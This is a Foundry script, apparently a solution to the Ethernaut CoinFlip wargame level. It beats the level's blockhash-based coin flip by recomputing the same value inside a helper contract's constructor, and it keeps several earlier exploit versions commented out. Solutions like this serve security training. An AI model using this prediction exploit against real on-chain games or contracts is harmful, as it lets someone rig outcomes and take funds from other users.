pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/03-CoinFlip.sol";
//import {CoinFlipExploit} from "src/CoinFlipExploit.sol";

// contract CoinFlipExploit {

//     uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
//     uint256 lastBlockValue;

//     function run(CoinFlip level) public {
//         uint256 blockNumber = uint256(blockhash(block.number - 1));
//         if (blockNumber == lastBlockValue) {
//             return;
//         }
//         uint256 coinFlip = blockNumber / FACTOR;
//         bool coinSide = coinFlip == 1 ? true : false;
//         level.flip(coinSide);
//         lastBlockValue = blockNumber;
//     }
// }

// contract Exp is Script {

//     //CoinFlip public CoinFlipInstance = CoinFlip(payable(0xE0e6B3495F10f2bA90BDeA224A2d1A4bB8499aF2));
//     uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
//     uint8 private immutable consecutiveWins = 10;
//     address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
//     //string private key = "0xE0e6B3495F10f2bA90BDeA224A2d1A4bB8499aF2";
//     address instance = address(0xE0e6B3495F10f2bA90BDeA224A2d1A4bB8499aF2);
    


//     function run() public {
//         vm.startBroadcast(hacker);
//         //CoinFlip CoinFlipInstance = CoinFlip(payable(0xE0e6B3495F10f2bA90BDeA224A2d1A4bB8499aF2));
        
//         CoinFlip level = CoinFlip(instance);
//         CoinFlipExploit exploit = new CoinFlipExploit();
        
//         vm.roll(block.number - consecutiveWins);
        
//         for (uint256 i = 1; i < consecutiveWins + 1; i++) {
//             uint256 lastBlockNumber = block.number;
//             vm.roll(lastBlockNumber + 1);
//             exploit.run(level);
//         }

//         console.log(level.consecutiveWins());
        
//         vm.stopBroadcast();
//     }
// }

// contract Exploit is Script {

//     uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
//     uint8 private immutable consecutiveWins = 10;
//     address instance = CoinFlip(0xA6d84D7a94790d38527FCA92c41d69b4C5D0FeA0);
//     address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    

//     function run() public {
//         vm.startBroadcast(hacker);

//         CoinFlip level = CoinFlip(instance);
//         CoinFlipExploit exploit = new CoinFlipExploit();
        
//         vm.roll(block.number - consecutiveWins);
        
//         for (uint256 i = 1; i < consecutiveWins + 1; i++) {
//             uint256 lastBlockNumber = block.number;
//             vm.roll(lastBlockNumber + 1);
//             exploit.run(level);
//         }


//         console.log(level.consecutiveWins());

//         vm.stopBroadcast();
//     }
// }
contract Player {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(side);
    }
}

contract CoinFlipSolution is Script {

    CoinFlip public coinflipInstance = CoinFlip(/*获取的实例地址*/);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(coinflipInstance);
        console.log("consecutiveWins: ", coinflipInstance.consecutiveWins());
        vm.stopBroadcast();
    }
}